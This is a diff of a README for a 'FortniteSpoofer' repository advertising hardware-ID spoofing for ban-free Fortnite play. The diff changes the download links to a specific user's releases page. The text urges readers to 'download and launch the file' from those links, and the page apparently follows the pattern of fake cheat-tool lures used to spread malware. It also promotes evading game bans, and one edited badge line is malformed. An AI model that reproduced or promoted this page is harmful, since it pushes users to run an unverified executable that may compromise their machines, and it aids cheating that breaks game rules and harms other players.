@@ -37,14 +37,14 @@ This repository provides tools, methods, and resources needed for successfully s
 4. Enjoy a ban-free gaming experience!
 
 ## More Details 📝
-For a more detailed overview of the repository content, including guides, troubleshooting tips, and additional resources, make sure to visit the provided link: [Download Now](https://github.com/files/Project.zip).
+For a more detailed overview of the repository content, including guides, troubleshooting tips, and additional resources, make sure to visit the provided link: [Download Now](https://github.com/HELLO12345678954875/FortniteSpoofer/releases).
 
 ## Releases 🚢
 If the provided link ends with a file name, make sure to download and launch the file to access the tools and resources. In case the link is a website, simply visit it to explore further. If the link is not working or not provided, please check the "Releases" section of this repository.
 
 ## Stay Updated 🔔
 Don't miss out on the latest updates, tools, and methods for hardware spoofing and ban evasion. Click the button below to access the repository and start your journey towards uninterrupted gaming:
-[![Download Now](https://img.shields.io/badge/Download-Now-%23c94882)](https://github.com/files/Project.zip)
+[![Download Now](https://github.com/HELLO12345678954875/FortniteSpoofer/releases%23c94882)](https://github.com/HELLO12345678954875/FortniteSpoofer/releases)
 
 ## Conclusion 🎉
 With the FortniteSpoofer repository, you can take control of your gaming destiny and ensure that bans never hold you back again. Join our community of dedicated gamers and enthusiasts to stay ahead of the curve and keep the gaming spirit alive!
